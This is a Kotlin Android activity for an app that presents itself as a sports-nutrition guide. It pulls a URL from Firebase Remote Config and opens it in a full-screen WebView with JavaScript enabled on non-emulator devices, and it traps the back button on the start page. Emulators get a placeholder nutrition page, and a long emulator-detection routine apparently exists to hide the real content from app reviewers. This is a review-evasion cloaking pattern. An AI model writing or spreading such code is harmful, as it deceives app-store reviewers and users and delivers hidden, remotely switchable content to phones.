package com.foxyura.endless.tz

import android.content.ContentValues.TAG
import android.content.Context
import android.graphics.Bitmap
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.Build
import android.os.Bundle
import android.util.Log
import android.view.ViewGroup
import android.webkit.CookieManager
import android.webkit.WebView
import android.webkit.WebViewClient
import android.widget.Toast
import androidx.activity.ComponentActivity
import androidx.activity.compose.BackHandler
import androidx.activity.compose.setContent
import androidx.compose.foundation.Image
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.material.Text
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.layout.ContentScale
import androidx.compose.ui.res.painterResource
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.compose.ui.viewinterop.AndroidView
import androidx.navigation.NavController
import androidx.navigation.compose.NavHost
import androidx.navigation.compose.composable
import androidx.navigation.compose.rememberNavController
import com.google.android.gms.tasks.OnCompleteListener
import com.google.firebase.ktx.Firebase
import com.google.firebase.messaging.FirebaseMessaging
import com.google.firebase.remoteconfig.ConfigUpdate
import com.google.firebase.remoteconfig.ConfigUpdateListener
import com.google.firebase.remoteconfig.FirebaseRemoteConfig
import com.google.firebase.remoteconfig.FirebaseRemoteConfigException
import com.google.firebase.remoteconfig.ktx.remoteConfig
import com.google.firebase.remoteconfig.ktx.remoteConfigSettings
import kotlinx.coroutines.delay
import java.util.*


class MainActivity : ComponentActivity() {
    val remoteConfig: FirebaseRemoteConfig = Firebase.remoteConfig  // Получение удаленного экземпляра конфигурации
    var backEnabled = mutableStateOf(false) // false - начальная страница, true - другие страницы.
    override fun onBackPressed() {
        if (backEnabled.value == true) {
            super.onBackPressed()
        }
    } //Не даёт выйти из приложения, находясь на начальной странице.

    @Composable fun VebContent(MyURL: String) {
        var webView: WebView? = null
        BackHandler(enabled = backEnabled.value) { webView?.goBack() }
        AndroidView(factory = {
            WebView(it).apply {
                layoutParams = ViewGroup.LayoutParams(
                    ViewGroup.LayoutParams.MATCH_PARENT,
                    ViewGroup.LayoutParams.MATCH_PARENT
                ) /*Полноэкраннный режим*/
                webViewClient = object : WebViewClient() {
                    override fun onPageStarted(view: WebView, url: String?, favicon: Bitmap?) {
                        backEnabled.value = view.canGoBack()
                        CookieManager.getInstance().setAcceptCookie(true)
                    }
                }
                loadUrl(MyURL)
                settings.javaScriptEnabled = true
                settings.domStorageEnabled = true
            }
        }, update = { webView = it })
    } // Веб- ресурс

    override fun onCreate(savedInstanceState: Bundle?) {
        val sharedPreference = SharedPreference(this)
        super.onCreate(savedInstanceState)
        setContent { Navigation(sharedPreference) }

        remoteConfig.fetchAndActivate().addOnCompleteListener(this) { task ->
            if (task.isSuccessful) {
                val updated = task.result
                Log.d(TAG, "Обновлены параметры конфигурации: $updated")
            }
        } // Загрузка значений

        remoteConfig.addOnConfigUpdateListener(object : ConfigUpdateListener {
            override fun onUpdate(configUpdate: ConfigUpdate) {
                Log.d(TAG, "Обновленные ключи: " + configUpdate.updatedKeys); }
            override fun onError(error: FirebaseRemoteConfigException) {
                Log.w(TAG, "Ошибка обновления конфигурации с кодом: " + error.code, error)
            }
        }) // Обновление конфигурации

        remoteConfig.fetchAndActivate().addOnCompleteListener(this) { task ->
            if (task.isSuccessful) {
                val updated = task.result
                Log.d(TAG, "Обновлены параметры конфигурации: $updated")
            }
        } // Загрузка значений
    }

    private fun checkIsEmu(): Boolean {
        if (BuildConfig.DEBUG) return false // when developer use this build on emulator
        val phoneModel = Build.MODEL
        val buildProduct = Build.PRODUCT
        val buildHardware = Build.HARDWARE
        var brand: String = Build.BRAND;
        var result = (Build.FINGERPRINT.startsWith("generic")
                || phoneModel.contains("google_sdk")
                || phoneModel.lowercase(Locale.getDefault()).contains("droid4x")
                || phoneModel.contains("Emulator")
                || phoneModel.contains("Android SDK built for x86")
                || Build.MANUFACTURER.contains("Genymotion")
                || buildHardware == "goldfish"
                || Build.BRAND.contains("google")
                || buildHardware == "vbox86"
                || buildProduct == "sdk"
                || buildProduct == "google_sdk"
                || buildProduct == "sdk_x86"
                || buildProduct == "vbox86p"
                || Build.BOARD.lowercase(Locale.getDefault()).contains("nox")
                || Build.BOOTLOADER.lowercase(Locale.getDefault()).contains("nox")
                || buildHardware.lowercase(Locale.getDefault()).contains("nox")
                || buildProduct.lowercase(Locale.getDefault()).contains("nox"))
        if (result) return true
        result = result or (Build.BRAND.startsWith("generic") && Build.DEVICE.startsWith("generic"))
        if (result) return true
        result = result or ("google_sdk" == buildProduct)
        return result
    } // Условие для проверки эмулятора из ТЗ




    @Composable
    fun notInternet() {
        Box(Modifier.fillMaxSize(), contentAlignment = Alignment.Center) {
            Text("Нет доступа к интернету.")
        }
    }

    @Composable
    fun zaglushka() {
        LazyColumn(Modifier.fillMaxSize()) {
            item {
                Box(Modifier.fillMaxWidth().padding(5.dp), contentAlignment = Alignment.Center){
                    Text("The basics of sports nutrition", fontSize = 24.sp)
                }
            }
            item {
                Box(Modifier.fillMaxWidth().padding(5.dp), contentAlignment = Alignment.Center){
                    Image(painter = painterResource(id = R.drawable.image1), contentDescription = "",contentScale = ContentScale.Fit)
                }
            }
            item {
                Box(Modifier.fillMaxWidth().padding(5.dp)) {
                    Text(
                        "Optimal sports performance results from following a well-balanced diet every day to ensure you are getting proper amounts of macro and micronutrients. Timing of meals and fluids are also very important. Your plan will guide you when and how to make these tweaks to help you reach surpass your goals. The four basic components are:"
                                + "\nHydration. Water is the most important nutrient for athletes. You should drink at least two quarts (64 oz.) of water each day, and even more before, during, and after a competition or exercise. Sports drinks deliver electrolytes and are generally advised for exercise lasting longer than 1 hour. Your plan will recommend what’s best for you."
                                + "\nCarbohydrates. Aim to get 60% to 70% of calories from carbohydrates, as this is your body’s most important source of fuel. Carbohydrates can be found in foods such as:"
                                + "\nFruits and vegetables\n" +
                                "Pasta\n" +
                                "Healthy bread like whole wheat\n" +
                                "Healthy cereal like oatmeal\n" +
                                "Rice"
                                + "\nYour body turns carbohydrates into energy (glucose) or stores it in your liver and muscle tissues (glycogen), giving you endurance and power for high-intensity, short-duration activities."
                                + "\nProteins. You should get 12% to 15% of your daily calories from foods like:\n" +
                                "Lean red meat, fish and poultry\n" +
                                "Eggs\n" +
                                "Beans and legumes\n" +
                                "Nuts\n" +
                                "Low-fat dairy"
                                + "\nYour body turns dietary protein into amino acids that enable your body to build new tissues and fluids."
                                + "\nFats. Aim to get 20% to 30% of calories from fat. Focus on consumption of unsaturated fats (found in plant foods such avocados, nuts, seeds, and oils). Minimize intake of saturated fats (found in animal-based foods such as meats, eggs, butter, and dairy)."
                                + "\nInclude Omega-3 fats as much as possible, as these can help to reduce inflammation. Good sources of Omega-3 fats include fatty fish (tuna, trout, halibut and salmon), flax seeds, chia seeds, and walnuts."
                                + "\nYour body uses fat for energy depending on the intensity and duration of exercise. Too much fat can be unhealthy, so it’s important to stick to your plan.",
                        fontSize = 16.sp
                    )
                }
            }
        }
    }

    fun checkForInternet(context: Context): Boolean {

        // register activity with the connectivity manager service
        val connectivityManager = context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager

        // if the android version is equal to M
        // or greater we need to use the
        // NetworkCapabilities to check what type of
        // network has the internet connection
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {

            // Returns a Network object corresponding to
            // the currently active default data network.
            val network = connectivityManager.activeNetwork ?: return false

            // Representation of the capabilities of an active network.
            val activeNetwork = connectivityManager.getNetworkCapabilities(network) ?: return false

            return when {
                // Indicates this network uses a Wi-Fi transport,
                // or WiFi has network connectivity
                activeNetwork.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) -> true

                // Indicates this network uses a Cellular transport. or
                // Cellular has network connectivity
                activeNetwork.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) -> true

                // else return false
                else -> false
            }
        } else {
            // if the android version is below M
            @Suppress("DEPRECATION") val networkInfo =
                connectivityManager.activeNetworkInfo ?: return false
            @Suppress("DEPRECATION")
            return networkInfo.isConnected
        }

    }
    @Composable
    fun Navigation(sharedPreference: SharedPreference) {
        val navController = rememberNavController()
        NavHost(
            navController = navController,
            startDestination = "splash_screen"
        ) {
            composable("splash_screen") {
                SplashScreen(navController = navController,sharedPreference)
            }

            // Main Screen
            composable("main_screen") {
                VebContent(sharedPreference.getValueString("url").toString())
            }
            composable("noInternet") {
                notInternet()
            }
            composable("update") {
                var navigation by remember { mutableStateOf("") }
                if (remoteConfig.getString("url") != ""||!checkIsEmu()) { //Ссылка не пустая?||не Эмулятор?
                    Log.d(TAG, "Ссылка не пустая")
                    navigation = "main_screen"
                    sharedPreference.save("url", remoteConfig.getString("url")) //Сохранение ссылки
                } else {  //Заглушка! Сервис или игра!
                    Log.d(TAG, "Ссылка пустая!!!")
                    navigation = "zaglushka"
                }
                LaunchedEffect(key1 = true) {
                    navController.navigate(navigation)
                }
            }
            composable("zaglushka") {
                zaglushka()
            }
        }
    }

    @Composable
    fun SplashScreen(navController: NavController, sharedPreference: SharedPreference) {
        var navigation by remember { mutableStateOf("") }
        val configSettings = remoteConfigSettings { minimumFetchIntervalInSeconds = 1600 }  // Частота обновлений
        remoteConfig.setConfigSettingsAsync(configSettings)

        //remoteConfig.setDefaultsAsync(R.xml.remote_config_defaults) // значения по умолчанию

        if (sharedPreference.getValueString("url") != null) { //Сохранена ли ссылка на устройстве?
            Log.d(TAG, "Ссылка есть на устройстве")
            if (checkForInternet(this)) { //Есть ли подключение к интернету?
                Log.d(TAG, "Интернет есть")
                navigation = "main_screen"
            } else {
                navigation = "noInternet"
            }  //Нет интернета
        } else {  //Не сохранена ссылка
            navigation = "update"
            Log.d(TAG, "Ссылки нет на устройстве")

        }
        LaunchedEffect(key1 = true) {
            delay(3600L)
            navController.navigate(navigation)
        }
        Box(contentAlignment = Alignment.Center, modifier = Modifier.fillMaxSize()) {
            Text("Добро пожаловать")
        }
    }
}



